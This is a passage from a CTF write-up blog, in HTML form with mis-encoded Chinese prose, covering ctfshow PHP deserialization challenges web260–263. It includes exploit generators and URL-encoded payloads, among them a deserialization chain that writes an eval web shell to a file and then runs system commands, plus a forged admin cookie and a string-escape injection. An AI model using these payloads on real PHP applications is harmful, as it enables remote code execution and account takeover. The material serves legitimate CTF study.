punctuation">(</span><span class="token variable">$post_string</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'^^^^'</span><span class="token operator">.</span><span class="token variable">$post_string</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'uri'</span><span class="token operator">=></span> <span class="token string double-quoted-string">"ssrf"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'^^'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"\r\n"</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><h4 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ctfshow_i_love_36D/'</span><span class="token punctuation">,</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>Â∫èÂàóÂåñÂá∫Êù•ÁöÑ‰∏úË•øÈúÄË¶ÅÂåÖÂê´Â≠óÁ¨¶‰∏≤ctfshow_i_love_36DÔºå<br>Áõ¥Êé•‰º†ctfhsow&#x3D;ctfshow_i_love_36DËØïËØïÔºåÊàêÂäüÂõûÊòæflag„ÄÇ</p><h4 id="web261-unserialize"><a href="#web261-unserialize" class="headerlink" title="web261(__unserialize)"></a>web261(__unserialize)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfshowvip</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$code</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">=</span><span class="token variable">$u</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">=</span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">!=</span><span class="token string single-quoted-string">''</span> <span class="token operator">||</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">!=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__unserialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">=</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">=</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span><span class="token operator">==</span><span class="token number">0x36d</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'vip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p><a href="https://www.php.net/manual/zh/language.oop5.magic.php#language.oop5.magic.sleep">PHP ÊñáÊ°£</a>‰∏≠ÊèêÂà∞</p><blockquote><p>Ê≥®ÊÑè:<br>Â¶ÇÊûúÁ±ª‰∏≠ÂêåÊó∂ÂÆö‰πâ‰∫Ü<code> __unserialize()</code> Âíå <code>__wakeup()</code> ‰∏§‰∏™È≠îÊúØÊñπÊ≥ïÔºåÂàôÂè™Êúâ <code>__unserialize()</code> ÊñπÊ≥ï‰ºöÁîüÊïàÔºå<code>__wakeup() </code>ÊñπÊ≥ï‰ºöË¢´ÂøΩÁï•„ÄÇ<br>Ê≥®ÊÑè:<br>Ê≠§ÁâπÊÄßËá™ PHP 7.4.0 Ëµ∑ÂèØÁî®„ÄÇ</p></blockquote><p>Êü•Áúã <code>response header</code> ÂèØÁü• <code>X-Powered-By: PHP/7.4.16</code>ÔºåÈÇ£‰πà <code>__wakeup</code> ÈÉ®ÂàÜÂ∞±‰∏ç‰ºöË¢´ÊâßË°åÔºå‰∏éÊ≥®ÈáäÊó†ÂºÇ„ÄÇ<br><code>__destruct</code> ÂáΩÊï∞ÈÉ®ÂàÜÂº±ÊØîËæÉ <code>$this-&gt;code==0x36d</code>ÔºåÂõ†‰∏∫ <code>$this-&gt;code = $this-&gt;username.$this-&gt;password;</code>Ôºå<code>username</code> ÂèØÊéßÂà∂ÔºåÂõ†‰∏∫ <code>(int)&#39;877.php&#39; == 0x36d</code>ÔºåÊïÖ‰º† <code>877.php</code> Âç≥ÂèØÁªïËøá„ÄÇ</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfshowvip</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$code</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">=</span><span class="token variable">$u</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">=</span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfshowvip</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'877.php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'&lt;?php @eval($_POST[1]);?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">GET</span><span class="token punctuation">:</span> <span class="token operator">?</span>vip<span class="token operator">=</span><span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A10<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>ctfshowvip<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A3<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>username<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A7<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22877.</span>php<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>password<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A25<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">3</span>Fphp<span class="token operator">+</span><span class="token operator">%</span><span class="token number">40</span>eval<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">24</span>_POST<span class="token operator">%</span><span class="token number">5</span>B1<span class="token operator">%</span><span class="token number">5</span>D<span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">3</span>F<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>code<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>BN<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token constant">POST</span><span class="token punctuation">:</span> <span class="token operator">/</span><span class="token number">877.</span>php       <span class="token number">1</span><span class="token operator">=</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tac /flag_is_here'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h4 id="web262-ÂèçÂ∫èÂàóÂåñÂ≠óÁ¨¶‰∏≤ÈÄÉÈÄ∏"><a href="#web262-ÂèçÂ∫èÂàóÂåñÂ≠óÁ¨¶‰∏≤ÈÄÉÈÄ∏" class="headerlink" title="web262(ÂèçÂ∫èÂàóÂåñÂ≠óÁ¨¶‰∏≤ÈÄÉÈÄ∏)"></a>web262(ÂèçÂ∫èÂàóÂåñÂ≠óÁ¨¶‰∏≤ÈÄÉÈÄ∏)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">message</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$from</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$msg</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$to</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token operator">=</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$m</span><span class="token punctuation">,</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">from</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">msg</span> <span class="token operator">=</span> <span class="token variable">$m</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">to</span> <span class="token operator">=</span> <span class="token variable">$t</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$f</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$m</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'m'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$t</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'t'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$m</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">message</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$m</span><span class="token punctuation">,</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$umsg</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'fuck'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'loveU'</span><span class="token punctuation">,</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$msg</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">,</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$umsg</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Your message has been sent'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>message.php</p><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">message</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$from</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$msg</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$to</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token operator">=</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$m</span><span class="token punctuation">,</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">from</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">msg</span> <span class="token operator">=</span> <span class="token variable">$m</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">to</span> <span class="token operator">=</span> <span class="token variable">$t</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$msg</span><span class="token operator">-></span><span class="token property">token</span><span class="token operator">==</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>Ê†πÊçÆmessage.phpÊèêÁ§∫ÔºåCookie‰º†ÂÖ•ÊûÑÈÄ†Â•ΩÁöÑmsgÂç≥ÂèØ</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">message</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$from</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$msg</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$to</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token operator">=</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">message</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><pre class="language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">msg=Tzo3OiJtZXNzYWdlIjo0OntzOjQ6ImZyb20iO047czozOiJtc2ciO047czoyOiJ0byI7TjtzOjU6InRva2VuIjtzOjU6ImFkbWluIjt9</span></span></code></pre><p>Ê≠£Á°ÆÂÅöÊ≥ïÂ∫îËØ•ÊòØËøêÁî®<strong>ÂèçÂ∫èÂàóÂåñÂ≠óÁ¨¶‰∏≤ÈÄÉÈÄ∏</strong>ÔºåËøêÁî®ÁöÑÊÄùÊÉ≥Ë∑üsqlÊ≥®ÂÖ•ÁöÑÈó≠ÂêàÁõ∏‰ºº</p><p>Êàë‰ª¨ËøôÈáåÊúâ‰∏Ä‰∏™Â∫èÂàóÂåñÂ≠óÁ¨¶‰∏≤ÔºåÊàë‰ª¨Ë¶ÅÊîπÂèòtokenÂ±ûÊÄßÔºå‰ΩÜÊàë‰ª¨Êó†Ê≥ïÁõ¥Êé•ÊéßÂà∂ÂÆÉÁöÑÂÄº„ÄÇ</p><p>Êàë‰ª¨Âè™ËÉΩÁªôfromÔºåmsgÔºåto‰º†ÈÄíÂÄºÔºåÂç≥Ëøô‰∏â‰∏™Â±ûÊÄßÊòØÂèØÊéßÁöÑ</p><pre class="language-none"><code class="language-none">O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;1&quot;;s:3:&quot;msg&quot;;s:1:&quot;2&quot;;s:2:&quot;to&quot;;s:1:&quot;3&quot;;s:5:&quot;token&quot;;s:4:&quot;user&quot;;&#125;</code></pre><p>ÂÅáÂ¶ÇÊàë‰ª¨ÂêëtoÂ±ûÊÄß‰º†ÈÄí <strong>t&#x3D;3‚Äù;s:5:‚Äùtoken‚Äù;s:5:‚Äùuser‚Äù;}</strong> Â≠óÁ¨¶‰∏≤Â∞±Âèò‰∏∫‰∫Ü‰∏ãÈù¢ËøôÊ†∑</p><pre class="language-none"><code class="language-none">O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;1&quot;;s:3:&quot;msg&quot;;s:1:&quot;2&quot;;s:2:&quot;to&quot;;s:27:&quot;3&quot;;s:5:&quot;token&quot;;s:4:&quot;user&quot;;&#125;&quot;;s:5:&quot;token&quot;;s:5:&quot;user&quot;;&#125;</code></pre><p>Êàë‰ª¨ÂØπÂ≠óÁ¨¶‰∏≤ËøõÊù•‰∫ÜÈó≠ÂêàÔºåËøôÊ†∑Êàë‰ª¨Â∞±ÂèØ‰ª•ÊéßÂà∂tokenÂ±ûÊÄßÁöÑÂÄº‰∫ÜÔºå‰ΩÜÊàë‰ª¨‰πü‰ºöÂèëÁé∞‰∏ÄÁÇπÔºåtoÂ±ûÊÄßÂÄºÁöÑÈïøÂ∫¶Âèò‰∏∫‰∫Ü27„ÄÇ</p><p>ÂèçÂ∫èÂàóÂåñÊó∂ÔºåÂ¶ÇÊûú‰∏∫27Âàô‰ºöÂåπÈÖçÂêéÈù¢27‰∏™Â≠óÁ¨¶ÔºåËøôÊ†∑Èó≠ÂêàÂ∞±Ê≤°ÊúâÊïàÊûú„ÄÇ</p><p>ËøôÊó∂ÂÄôÈ¢òÁõÆ‰∏≠ÁöÑÊõøÊç¢Â≠óÁ¨¶ÂáΩÊï∞ÂèØ‰ª•Â∏ÆÂä©Âà∞Êàë‰ª¨</p><pre class="language-none"><code class="language-none">$umsg &#x3D; str_replace(&#39;fuck&#39;, &#39;loveU&#39;, serialize($msg));</code></pre><p>str_replace‰ºöÂ∞ÜfuckÊõøÊç¢‰∏∫loveUÔºå‰∏îÊõøÊç¢ÊòØÂú®Â∫èÂàóÂåñ‰πãÂêéËøõË°åÔºå‰πüÂ∞±ÊòØËØ¥Ôºå<strong>ÂÆûÈôÖÂ≠óÁ¨¶‰∏≤ÈïøÂ∫¶Â¢ûÂä†‰∫Ü1Ôºå‰ΩÜÊ†áÊòéÁöÑÂ≠óÁ¨¶‰∏≤ÈïøÂ∫¶‰ªªÁÑ∂‰∏∫ÂéüÂÄº</strong></p><pre class="language-none"><code class="language-none">&#x2F;&#x2F; ÊõøÊç¢Ââçs:2:&quot;to&quot;;s:4:&quot;fuck&quot;;&#x2F;&#x2F; ÊõøÊç¢Âêés:2:&quot;to&quot;;s:4:&quot;loveU&quot;;</code></pre><p>ÈÄöËøáËøôÁßçÊñπÊ≥ïÔºåÊàë‰ª¨Â∞±ÂèØ‰ª•Âá≠Á©∫Â¢ûÂä†Â≠óÁ¨¶ÔºåÊù•ÊàêÂäüËøõË°åÈó≠Âêà</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F; t&#x3D;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x2F;&#x2F; ÂêéÈù¢Â§öÂá∫27‰∏™Â≠óÁ¨¶ÔºåÊâÄ‰ª•Êàë‰ª¨ÂÜô27‰∏™fuckÔºåÊõøÊç¢‰∏∫loveUÂêéÔºåÂ¢ûÂä†‰∫Ü27‰∏™Â≠óÁ¨¶ÔºåÊù•ËææÂà∞Â≠óÁ¨¶‰∏≤ÈÄÉÈÄ∏</code></pre><p>ÊúÄÁªàÊàë‰ª¨ÁöÑpayload‰∏∫</p><pre class="language-none"><code class="language-none">f&#x3D;1&amp;m&#x3D;2&amp;t&#x3D;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code></pre><h4 id="web263-SessionÂèçÂ∫èÂàóÂåñ"><a href="#web263-SessionÂèçÂ∫èÂàóÂåñ" class="headerlink" title="web263(SessionÂèçÂ∫èÂàóÂåñ)"></a>web263(SessionÂèçÂ∫èÂàóÂåñ)</h4><p>ÂàöÂºÄÂßã‰ª•‰∏∫Âº±ÂØÜÁ†ÅÔºå‰ΩÜÊòØÊàêÂäüÔºå‰∫éÊòØÊâ´ÊèèÂà∞Â§á‰ªΩÊñá‰ª∂<code>www.zip</code></p><p>index.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Ë∂ÖËøá5Ê¨°Á¶ÅÊ≠¢ÁôªÈôÜ</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limti'</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token number">5</span><span class="token operator">?</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ÁôªÈôÜÂ§±Ë¥•Ê¨°Êï∞Ë∂ÖËøáÈôêÂà∂"</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'limit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span 